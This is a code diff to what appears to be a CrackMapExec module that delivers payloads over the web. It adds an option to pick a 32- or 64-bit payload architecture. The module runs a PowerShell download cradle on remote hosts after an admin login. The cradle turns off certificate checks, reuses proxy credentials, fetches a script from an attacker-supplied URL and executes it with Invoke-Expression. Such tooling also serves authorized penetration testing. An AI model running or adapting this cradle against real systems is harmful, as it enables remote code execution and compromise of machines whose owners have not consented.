@@ -21,6 +21,7 @@ class CMEModule:
     def options(self, context, module_options):
         '''
         URL  URL for the download cradle
+        PAYLOAD  Payload architecture (choices: 64 or 32) Default: 64
         '''
 
         if not 'URL' in module_options:
@@ -29,7 +30,17 @@ class CMEModule:
 
         self.url = module_options['URL']
 
+        self.payload = "64"
+        if 'PAYLOAD' in module_options:
+            if module_options['PAYLOAD'] not in ['64', '32']:
+                context.log.error('Invalid value for PAYLOAD option!')
+                exit(1)
+            self.payload = module_options['PAYLOAD']
+
     def on_admin_login(self, context, connection):
         ps_command = '''[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('{}');'''.format(self.url)
-        connection.ps_execute(ps_command, force_ps32=True)
+        if self.payload == "32":
+            connection.ps_execute(ps_command, force_ps32=True)
+        else:
+            connection.ps_execute(ps_command, force_ps32=False)
         context.log.success('Executed web-delivery launcher')
